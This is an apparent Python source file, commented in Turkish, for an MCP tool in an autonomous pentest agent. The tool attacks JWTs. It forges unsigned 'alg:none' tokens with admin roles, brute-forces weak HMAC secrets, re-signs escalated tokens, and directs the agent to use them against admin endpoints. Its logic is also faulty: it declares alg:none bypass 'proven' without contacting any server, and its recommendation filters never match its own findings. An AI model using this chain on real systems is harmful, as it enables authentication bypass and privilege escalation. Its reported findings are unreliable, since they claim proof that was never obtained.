"""
api_vuln_jwt_tester.py - Pentagent Projesi için MCP Uyumlu JWT Zafiyet Tarayıcısı

Amaç: 
Bu araç, verilen bir JWT (JSON Web Token) üzerinde bilinen kritik zafiyetleri test eder.
Temel amacı, token'ın imza doğrulamasını atlatmanın veya zayıf bir sırrı kırarak yeni,
geçerli token'lar (örneğin, sahte admin token'ları) oluşturmanın mümkün olup olmadığını
kanıtlamaktır.

Temel Felsefeye Uygunluk:
- Keşfet & Tespit Et: Bir kimlik doğrulama mekanizmasının (JWT) kalbindeki tasarım ve
  uygulama hatalarını (alg:none, weak secret vb.) tespit eder.
- Kanıtla: Zafiyetin varlığını, teoride bırakmaz. Başarıyla oluşturulmuş, potansiyel
  olarak geçerli ve yetkisi yükseltilmiş yeni bir token (`exploited_token`) üreterek
  somut bir kanıt sunar.
- RAG Girdisi Sağla: 'data' alanında, bulunan her bir JWT zafiyetini, türünü, ciddiyetini
  ve kanıt niteliğindeki sahte token'ı yapılandırılmış bir formatta sağlar.
- Otonom Ajanı Yönlendir: 'recommendations' alanı ile MCP'ye, "alg:none zafiyetini
  kullanarak bir admin token'ı ürettim. Şimdi bu token'ı kullanarak 'api_privilege_escalator'
  aracıyla yetki yükseltmeyi dene" gibi, saldırının bir sonraki aşamasını tetikleyen
  net ve kritik komutlar verir.
"""
import jwt
import json
import base64
import hmac
import hashlib
import asyncio
import time
from typing import Dict, Any, List, Optional
import logging

# PentagentTool base class'ını import et
import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from tools.base_mcp_tool import MCPTool, ToolCategory, PriorityLevel

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Yaygın olarak kullanılan zayıf sırlar. Gerçek bir senaryoda bu liste çok daha büyük olur.
COMMON_SECRETS = ['secret', 'password', '123456', 'admin', 'jwt', 'key', 'secret_key', 'dev', 'test']

class ApiVulnJwtTesterTool(MCPTool):
    """JWT (JSON Web Token) üzerinde bilinen zafiyetleri test eder."""
    def __init__(self):
        super().__init__(
            name="api_vuln_jwt_tester",
            description="JWT token'larını 'alg:none', zayıf şifre ve diğer yaygın zafiyetler için analiz eder.",
            category=ToolCategory.API_SECURITY
        )

    def _decode_token_unsafe(self, token: str) -> Optional[Dict]:
        """Bir JWT'yi imza doğrulaması yapmadan ayrıştırır."""
        try:
            parts = token.split('.')
            if len(parts) != 3: return None
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            return {"header": header, "payload": payload, "signature": parts[2]}
        except Exception as e:
            logger.error(f"Token decode edilemedi: {e}")
            return None

    def _test_none_algorithm(self, decoded_token: Dict) -> Optional[Dict]:
        """alg:none zafiyetini test eder ve sahte bir token üretir."""
        header, payload = decoded_token["header"], decoded_token["payload"]
        
        # Admin yetkisi eklemeyi dene
        payload['role'] = 'admin'
        payload['is_admin'] = True
        
        header['alg'] = 'none'
        
        header_encoded = base64.urlsafe_b64encode(json.dumps(header, separators=(",", ":")).encode()).decode().rstrip("=")
        payload_encoded = base64.urlsafe_b64encode(json.dumps(payload, separators=(",", ":")).encode()).decode().rstrip("=")
        
        exploited_token = f"{header_encoded}.{payload_encoded}."
        
        return {
            "vulnerability_type": "NONE_ALGORITHM_BYPASS",
            "severity": "CRITICAL",
            "description": "JWT imza doğrulaması, 'alg' header'ı 'none' olarak ayarlanarak atlatılabiliyor.",
            "exploited_token": exploited_token,
            "proof": "Başarıyla 'admin' yetkisine sahip imzasız bir token oluşturuldu."
        }

    def _test_weak_secret(self, token: str, decoded_token: Dict) -> Optional[Dict]:
        """Yaygın zayıf sırları brute-force ile dener."""
        header, payload = decoded_token["header"], decoded_token["payload"]
        alg = header.get('alg')
        if not alg or not alg.startswith('HS'): return None

        token_parts = token.split('.')
        message = f"{token_parts[0]}.{token_parts[1]}".encode()
        signature_to_match = base64.urlsafe_b64decode(token_parts[2] + '==')
        
        hash_alg = getattr(hashlib, f"sha{alg[2:]}")

        for secret in COMMON_SECRETS:
            try:
                computed_sig = hmac.new(secret.encode(), message, hash_alg).digest()
                if hmac.compare_digest(computed_sig, signature_to_match):
                    # Zayıf sır bulundu! Yetki yükseltilmiş yeni bir token üret.
                    payload['role'] = 'admin'
                    payload['is_admin'] = True
                    exploited_token = jwt.encode(payload, secret, algorithm=alg)
                    return {
                        "vulnerability_type": "WEAK_SECRET",
                        "severity": "CRITICAL",
                        "description": f"JWT, bilinen zayıf bir sır ('{secret}') ile imzalanmış.",
                        "exploited_token": exploited_token,
                        "proof": f"'{secret}' sırrı kullanılarak 'admin' yetkisine sahip yeni bir token başarıyla oluşturuldu."
                    }
            except Exception:
                continue
        return None

    def _perform_jwt_analysis(self, token: str) -> List[Dict]:
        """JWT analizinin ana mantığını yürütür. Önce somut zafiyetleri, sonra potansiyel zafiyetleri test eder."""
        vulnerabilities = []
        decoded_token = self._decode_token_unsafe(token)
        if not decoded_token:
            raise ValueError("Geçersiz JWT formatı.")

        # ÖNCELİK 1: Somut zafiyetler (zayıf sır) - En kritik bulgular
        weak_secret_vuln = self._test_weak_secret(token, decoded_token)
        if weak_secret_vuln:
            vulnerabilities.append(weak_secret_vuln)
            # Zayıf sır bulunduysa, bu en önemli bulgudur
            # Diğer testleri de yapmaya devam edelim ama öncelik zayıf sırda

        # ÖNCELİK 2: Potansiyel zafiyetler (alg:none) - Her zaman bir olasılık
        none_vuln = self._test_none_algorithm(decoded_token)
        if none_vuln:
            vulnerabilities.append(none_vuln)
            
        # Gelecekte eklenebilecek diğer testler buraya gelebilir (key confusion vb.)

        return vulnerabilities

    def _generate_mcp_recommendations(self, findings: List[Dict]) -> List[Dict]:
        """Bulgulara göre MCP için eyleme geçirilebilir öneriler üretir."""
        recommendations = []
        for vuln in findings:
            if vuln.get("severity") == "CRITICAL" and vuln.get("exploited_token"):
                recommendations.append(
                    self._create_recommendation(
                        priority=PriorityLevel.CRITICAL,
                        tool_name="api_privilege_escalator",
                        reason=f"Kritik bir JWT zafiyeti ({vuln['vulnerability_type']}) tespit edildi ve yetkisi yükseltilmiş bir token üretildi. Bu token ile yetki yükseltme denenmeli.",
                        params={
                            "forged_token": vuln["exploited_token"],
                            "target_endpoints": ["/admin", "/api/v1/users", "/me", "/profile"]
                        }
                    )
                )
        return recommendations

    def _generate_dynamic_jwt_recommendations(self, findings: List[Dict]) -> List[Dict]:
        """Dinamik JWT önerileri oluşturur."""
        recommendations = []
        
        if not findings:
            return recommendations
        
        # JWT zafiyet türlerini analiz et
        alg_none_findings = [f for f in findings if f.get('vulnerability_type') == 'Algorithm None']
        weak_secret_findings = [f for f in findings if f.get('vulnerability_type') == 'Weak Secret']
        critical_findings = [f for f in findings if f.get('severity') == 'critical']
        
        # Algorithm None zafiyetleri için özel öneriler
        if alg_none_findings:
            for finding in alg_none_findings[:2]:  # İlk 2 alg:none finding
                recommendations.append({
                    "priority": "critical",
                    "tool": "human_intervention_alert",
                    "reason": f"🚨 ALGORITHM NONE ZAFİYETİ: JWT token'ında algorithm none zafiyeti tespit edildi. Token imzası bypass edilebilir.",
                    "params": {
                        "vulnerability_type": "Algorithm None",
                        "severity": finding['severity'],
                        "exploited_token": finding.get('exploited_token', ''),
                        "urgent_review": True,
                        "rag_query": f"JWT algorithm none vulnerability remediation"
                    },
                    "expert_context": f"Algorithm none zafiyeti için kritik analiz. JWT token imzası bypass edilebilir, yetkisiz token oluşturma mümkün. Detaylı güvenlik analizi ve remediation planı gerekli."
                })
        
        # Weak Secret zafiyetleri için özel öneriler
        if weak_secret_findings:
            for finding in weak_secret_findings[:2]:  # İlk 2 weak secret finding
                recommendations.append({
                    "priority": "high",
                    "tool": "vuln_dependency_scanner",
                    "reason": f"⚠️ WEAK SECRET ZAFİYETİ: JWT token'ında zayıf secret kullanımı tespit edildi. Secret brute force edilebilir.",
                    "params": {
                        "vulnerability_type": "Weak Secret",
                        "severity": finding['severity'],
                        "exploited_token": finding.get('exploited_token', ''),
                        "secret_cracking": True,
                        "rag_query": f"JWT weak secret vulnerability remediation"
                    },
                    "expert_context": f"Weak secret zafiyeti için kritik analiz. JWT secret brute force edilebilir, yetkisiz token oluşturma mümkün. Secret güçlendirme ve güvenlik analizi gerekli."
                })
        
        # Kritik zafiyetler için özel öneriler
        if critical_findings:
            for finding in critical_findings[:2]:  # İlk 2 kritik finding
                recommendations.append({
                    "priority": "critical",
                    "tool": "human_intervention_alert",
                    "reason": f"🚨 KRİTİK JWT ZAFİYETİ: {finding['vulnerability_type']} zafiyeti tespit edildi. Authentication bypass mümkün.",
                    "params": {
                        "vulnerability_type": finding['vulnerability_type'],
                        "severity": finding['severity'],
                        "exploited_token": finding.get('exploited_token', ''),
                        "authentication_bypass": True,
                        "urgent_review": True,
                        "rag_query": f"Critical JWT vulnerability remediation for {finding['vulnerability_type']}"
                    },
                    "expert_context": f"Kritik JWT zafiyeti için acil müdahale. {finding['vulnerability_type']} zafiyeti authentication bypass'a yol açabilir. Detaylı güvenlik analizi ve remediation planı gerekli."
                })
        
        # Genel JWT güvenlik önerileri
        if findings:
            recommendations.append({
                "priority": "high",
                "tool": "vuln_dependency_scanner",
                "reason": f"🔐 JWT GÜVENLİK ANALİZİ: {len(findings)} JWT zafiyeti tespit edildi. Authentication mekanizması gözden geçirilmeli.",
                "params": {
                    "total_vulnerabilities": len(findings),
                    "alg_none_count": len(alg_none_findings),
                    "weak_secret_count": len(weak_secret_findings),
                    "critical_count": len(critical_findings),
                    "jwt_security_review": True
                },
                "expert_context": f"JWT güvenlik analizi için kapsamlı inceleme. {len(findings)} JWT zafiyeti için detaylı authentication kontrolleri ve token güvenliği analiz edilmeli."
            })
        
        return recommendations

    def _create_final_output(self, findings: List[Dict], recommendations: List[Dict], reasoning_log: List[Dict], original_token: str, rag_data: Dict = None) -> Dict:
        """Tüm verileri standart MCP JSON formatında birleştirir."""
        summary = f"JWT analizi tamamlandı. {len(findings)} adet kritik zafiyet bulundu. "
        if not findings:
            summary = "JWT analizi tamamlandı. Test edilen temel vektörlerde (alg:none, weak secret) bir zafiyet bulunamadı."
        else:
            summary += f"MCP ajanı için {len(recommendations)} adet bir sonraki adım önerisi oluşturuldu."

        decoded_info = self._decode_token_unsafe(original_token)

        data = {
            "token_info": {
                "algorithm": decoded_info.get("header", {}).get("alg"),
                "payload_keys": list(decoded_info.get("payload", {}).keys())
            },
            "vulnerabilities": findings
        }
        
        if rag_data:
            data["rag_analysis_data"] = rag_data

        return {
            "success": True,
            "data": data,
            "ai_summary": summary,
            "ai_reasoning": reasoning_log,
            "recommendations": recommendations,
            "error": None
        }

    def run_tool(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Aracın ana giriş noktası."""
        token = params.get("token")
        reasoning_log = []
        try:
            self._add_reasoning(reasoning_log, "initialization", "JWT analizi başlatılıyor. Token yapısı incelenecek.")
            
            if not token or len(token.split('.')) != 3:
                raise ValueError("Geçerli bir JWT token'ı gereklidir.")

            # JWT analizini yürüt
            findings = self._perform_jwt_analysis(token)

            if findings:
                self._add_reasoning(reasoning_log, "critical_finding", f"⚠️ {len(findings)} adet KRİTİK JWT zafiyeti tespit edildi. Yetkisiz token oluşturmak mümkün.")
            else:
                self._add_reasoning(reasoning_log, "analysis_complete", "Analiz tamamlandı. Temel JWT zafiyetlerine rastlanmadı.")

            recommendations = self._generate_mcp_recommendations(findings)
            self._add_reasoning(reasoning_log, "recommendation", f"Bulgulara dayanarak {len(recommendations)} adet bir sonraki adım önerisi oluşturuldu.")
            
            self._add_reasoning(reasoning_log, "completion", "JWT analizi başarıyla tamamlandı, sonuçlar formatlanıyor.")
            
            # Dinamik öneriler oluştur
            recommendations = self._generate_dynamic_jwt_recommendations(findings)
            
            # RAG-friendly format ekle
            rag_data = {
                "jwt_vulnerabilities": [
                    {
                        "vulnerability_type": finding['vulnerability_type'],
                        "severity": finding['severity'],
                        "description": finding['description'],
                        "exploited_token": finding.get('exploited_token', ''),
                        "rag_query_suggestion": f"JWT vulnerability remediation for {finding['vulnerability_type']}"
                    }
                    for finding in findings
                ],
                "scan_metadata": {
                    "scan_timestamp": time.time(),
                    "scan_type": "jwt_vulnerability_testing",
                    "total_vulnerabilities_found": len(findings),
                    "critical_vulnerabilities": len([f for f in findings if f.get('severity') == 'critical'])
                }
            }
            
            self._add_reasoning(reasoning_log, "completion", "JWT analizi başarıyla tamamlandı, sonuçlar formatlanıyor.")
            
            return self._create_final_output(findings, recommendations, reasoning_log, token, rag_data)

        except Exception as e:
            error_message = f"JWT tarayıcısı çalıştırılırken hata oluştu: {str(e)}"
            logger.error(error_message, exc_info=True)
            self._add_reasoning(reasoning_log, "error", error_message)
            return self._create_final_output([], [], reasoning_log, token)

def main():
    """Aracın komut satırından test edilmesi için ana fonksiyon."""
    print("--- JWT Zafiyet Tarayıcı Test Modu ---")

    # Senaryo 1: alg:none için zafiyetli olabilecek bir token
    header_none = {"alg": "HS256", "typ": "JWT"}
    payload_none = {"user": "testuser", "role": "user", "exp": 9999999999}
    secret_none = "some-key-that-will-not-be-guessed"
    vulnerable_to_none_token = jwt.encode(payload_none, secret_none, algorithm="HS256", headers=header_none)
    
    # Senaryo 2: Zayıf şifre ile imzalanmış token
    header_weak = {"alg": "HS256", "typ": "JWT"}
    payload_weak = {"user": "weakuser", "role": "user"}
    secret_weak = "secret" # Yaygın zayıf şifre
    weak_secret_token = jwt.encode(payload_weak, secret_weak, algorithm="HS256", headers=header_weak)
    
    # Senaryo 3: Güvenli token
    secure_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

    tool = ApiVulnJwtTesterTool()
    
    print("\n--- Test 1: 'alg:none' Zafiyet Senaryosu ---")
    result1 = tool.run_tool({"token": vulnerable_to_none_token})
    print(json.dumps(result1, indent=4, ensure_ascii=True))
    
    print("\n--- Test 2: 'Weak Secret' Zafiyet Senaryosu ---")
    result2 = tool.run_tool({"token": weak_secret_token})
    print(json.dumps(result2, indent=4, ensure_ascii=True))

    print("\n--- Test 3: Güvenli Token Senaryosu ---")
    result3 = tool.run_tool({"token": secure_token})
    print(json.dumps(result3, indent=4, ensure_ascii=True))

if __name__ == "__main__":
    main()